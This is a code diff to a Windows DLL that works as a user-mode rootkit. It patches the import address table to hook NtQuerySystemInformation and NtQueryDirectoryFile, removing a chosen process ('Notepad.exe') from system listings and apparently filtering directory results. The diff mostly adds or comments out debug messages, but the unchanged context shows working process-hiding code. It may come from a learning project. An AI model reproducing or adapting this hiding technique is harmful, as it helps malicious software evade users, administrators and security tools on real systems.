@@ -21,7 +21,7 @@ PIMAGE_IMPORT_BY_NAME pImportByNameIAT;
 MEMORY_BASIC_INFORMATION mbi;
 
 BYTE* p_original_func;
-const wchar_t* to_hide = L"benign.exe";
+const wchar_t* to_hide = L"Notepad.exe";
 
 NTSTATUS MyNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
 NTSTATUS MyNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan);
@@ -44,11 +44,14 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     switch (ul_reason_for_call)
     {
     case DLL_PROCESS_ATTACH:
+		OutputDebugString("Attaching");
+		DisableThreadLibraryCalls(hModule);
         PatchIAT(to_patch, (BYTE*)MyNtQuerySystemInformation);
         break;
     case DLL_THREAD_ATTACH:
     case DLL_THREAD_DETACH:
     case DLL_PROCESS_DETACH:
+		OutputDebugString("Detaching");
 		PatchIAT(to_patch, p_original_func);
         break;
     }
@@ -63,7 +66,7 @@ std::string getProcName() {
 	size_t last_index = proc_name.find_last_of("\\");
 	proc_name = proc_name.substr(last_index + 1);
 	proc_name[0] = toupper(proc_name[0]);
-	OutputDebugString(proc_name.c_str());
+	//OutputDebugString(proc_name.c_str());
 	return proc_name;
 }
 
@@ -122,8 +125,8 @@ NTSTATUS MyNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationCl
             {
                 if (curr->ImageName.Buffer != NULL)
                 {
-					OutputDebugString("Current process name: ");
-					OutputDebugStringW(curr->ImageName.Buffer);
+					//OutputDebugString("Current process name: ");
+					//OutputDebugStringW(curr->ImageName.Buffer);
                     if (wcscmp(curr->ImageName.Buffer, to_hide) == 0)
                     {
                         OutputDebugString("Found the process to hide");
@@ -164,6 +167,9 @@ NTSTATUS MyNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationCl
 NTSTATUS MyNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan) {
     NTSTATUS status = ((NTSTATUS(*)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS, BOOLEAN, PUNICODE_STRING, BOOLEAN))p_original_func)(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
 	if (NT_SUCCESS(status)) {
+		OutputDebugString("In the hook");
+		OutputDebugString("FileInformationClass: ");
+		OutputDebugString(std::to_string(FileInformationClass).c_str());
         switch (FileInformationClass)
         {
             case FILE_INFORMATION_CLASS_::FileIdBothDirectoryInformation:
